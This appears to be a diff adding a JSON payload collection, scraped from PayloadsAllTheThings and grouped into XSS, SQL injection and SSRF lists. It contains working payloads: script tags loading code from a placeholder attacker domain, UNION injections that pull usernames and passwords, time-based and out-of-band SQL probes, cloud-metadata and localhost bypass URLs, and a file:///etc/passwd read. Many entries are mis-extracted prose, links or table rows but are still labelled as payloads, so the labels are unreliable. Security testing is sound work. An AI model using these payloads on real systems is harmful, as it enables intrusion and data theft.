+        "payload": "<iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert('svg foreignObject iframe');\" width=\"400\" height=\"250\"/>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<title><script>alert('svg title')</script></title>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>\");",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "\"><script src=\"https://js.rip/[ATTACKER.DOMAIN.TLD]\"></script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "\"><script src=//[ATTACKER.DOMAIN.TLD]></script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      }
+    ],
+    "sqli": [
+      {
+        "payload": "* [UNION Based Injection](#union-based-injection)",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "* **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "| SQLITE              | `last_insert_rowid()>1` |",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "SELECT * FROM users WHERE username = 'user' AND password = 'pass';",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": ":warning: Avoid using this payload indiscriminately, as it always returns true. It could interact with endpoints that may inadvertently delete sessions, files, configurations, or database data.",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "sql = \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\";",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "sql1 = \"SELECT * FROM admin WHERE pass = '\".md5(\"ffifdyop\", true).\"'\";",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "sql1 = \"SELECT * FROM admin WHERE pass = ''or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\u001c'\";",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "* Query the database for the user record (e.g., `SELECT username, password_hash FROM users WHERE username = ?`).",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: select as many columns as necessary, here 161ebd7d45089b3446ee4e0d86dbcf92 corresponds to `MD5(\"P@ssw0rd\")`.",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "SELECT product_name, product_price FROM products WHERE product_id = 'input_id';",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "1' UNION SELECT username, password FROM users --",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": ":warning: The 2 SELECT clauses must have the same number of columns.",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "LIMIT CAST((SELECT version()) as numeric)",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "* Default `SLEEP` function for the database",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "' AND SLEEP(5)/*",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "' AND '1'='1' AND SLEEP(5)",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "' ; WAITFOR DELAY '00:00:05' --",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "BENCHMARK(2000000,MD5(NOW()))",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "' union select 0x2720756e696f6e2073656c65637420312c3223#",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "INSERT INTO users (username, email) VALUES ('attacker\\'--', 'attacker@example.com');",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "query = \"SELECT * FROM logs WHERE username = '\" + user_from_db + \"'\"",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "* SQL injection anywhere inside a PDO statement: `$pdo->prepare(\"SELECT $INJECT_SQL_HERE...\")`.",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "$stmt = $pdo->prepare(\"SELECT $col FROM animals WHERE name = ?\");",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "$stmt = $pdo->prepare(\"SELECT $col FROM animals WHERE name = :name\");",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "* Force a select \\`'x\\` instead of a column name and create a comment. Inject a backtick to fix the column and terminate the SQL query with `;#`: `GET /index.php?col=%3f%23%00&name=x%60;%23`",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "Column not found: 1054 Unknown column ''x' in 'SELECT'",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "* Inject in second parameter the payload. `GET /index2.php?col=\\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`'x`+from+information_schema.tables)y%3b%2523`",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "SELECT `\\?#\\0` FROM animals WHERE name = ?",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "SELECT `\\'x` FROM (SELECT table_name AS `\\'x` from information_schema.tables)y;#'#\\0` FROM animals WHERE name = ?",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "* [Root Me - SQL injection - Insert](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Insert)",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      },
+      {
+        "payload": "* [SQLi in INSERT worse than SELECT - Mathias Karlsson - February 14, 2017](https://web.archive.org/web/20231004093323/https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)",
+        "category": "sqli",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "SQL injection payload",
+        "tags": [
+          "sqli",
+          "database"
+        ]
+      }
+    ],
+    "ssrf": [
+      {
+        "payload": "url = input(\"Enter URL:\")",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "response = requests.get(url)",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "return response",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://169.254.169.254/latest/meta-data/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://localhost:80",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://localhost:22",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "https://localhost:443",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.0.0.1:80",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.0.0.1:22",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "https://127.0.0.1:443",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://0.0.0.0:80",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://0.0.0.0:22",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "https://0.0.0.0:443",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://[::]:80/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://[0000::1]:80/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://[::ffff:127.0.0.1]",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.127.127.127",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.0.1.3",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.0.0.0",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://0/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.0.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://2130706433/ = http://127.0.0.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://3232235521/ = http://192.168.0.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://3232235777/ = http://192.168.1.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://2852039166/ = http://169.254.169.254",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://0177.0.0.1/ = http://127.0.0.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://o177.0.0.1/ = http://127.0.0.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://0o177.0.0.1/ = http://127.0.0.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://q177.0.0.1/ = http://127.0.0.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://0x7f000001 = http://127.0.0.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://0xc0a80101 = http://192.168.1.1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://0xa9fea9fe = http://169.254.169.254",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.0.0.1/%61dmin",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.0.0.1/%2561dmin",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://\u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc = example.com",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://ip6-localhost = ::1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://ip6-loopback = ::1",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "https://307.r3dir.me/--to/?url=http://localhost",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "Address: 1.2.3.4",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "Address: 169.254.169.254",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.1.1.1:80\\@127.2.2.2:80/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.1.1.1:80\\@@127.2.2.2:80/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.1.1.1:80:\\@@127.2.2.2:80/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http://127.1.1.1:80#\\@127.2.2.2:80/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "http:127.0.0.1/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "<?php",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "echo var_dump(filter_var(\"http://test???test.com\", FILTER_VALIDATE_URL));",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "echo var_dump(filter_var(\"0://evil.com;google.com\", FILTER_VALIDATE_URL));",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "?>",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "jar:scheme://domain/path!/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "jar:http://127.0.0.1!/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "jar:https://127.0.0.1!/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "jar:ftp://127.0.0.1!/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "file:///etc/passwd",
